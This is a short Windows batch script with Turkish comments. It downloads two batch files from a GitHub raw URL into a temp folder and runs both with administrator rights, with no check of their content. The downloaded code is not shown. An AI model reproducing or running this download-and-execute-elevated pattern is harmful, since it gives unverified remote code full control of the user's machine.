@echo off
setlocal

:: Geçici klasör
set "TEMP_DIR=%TEMP%\bat_scripts"
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"

:: Dosya URL'leri
set "UPDATE_BAT_URL=https://raw.githubusercontent.com/xipperzo/sirketbaglantisi/main/update.bat"
set "A_BAT_URL=https://raw.githubusercontent.com/xipperzo/sirketbaglantisi/main/a.bat"

:: İndirilecek dosya yolları
set "UPDATE_BAT_PATH=%TEMP_DIR%\update.bat"
set "A_BAT_PATH=%TEMP_DIR%\a.bat"

:: Dosyaları indir
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%UPDATE_BAT_URL%', '%UPDATE_BAT_PATH%')"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%A_BAT_URL%', '%A_BAT_PATH%')"

:: update.bat dosyasını yönetici olarak çalıştır
powershell -Command "Start-Process cmd -ArgumentList '/c \"%UPDATE_BAT_PATH%\"' -Verb RunAs -Wait"

:: a.bat dosyasını yönetici olarak çalıştır
powershell -Command "Start-Process cmd -ArgumentList '/c \"%A_BAT_PATH%\"' -Verb RunAs -Wait"

endlocal
exit /b
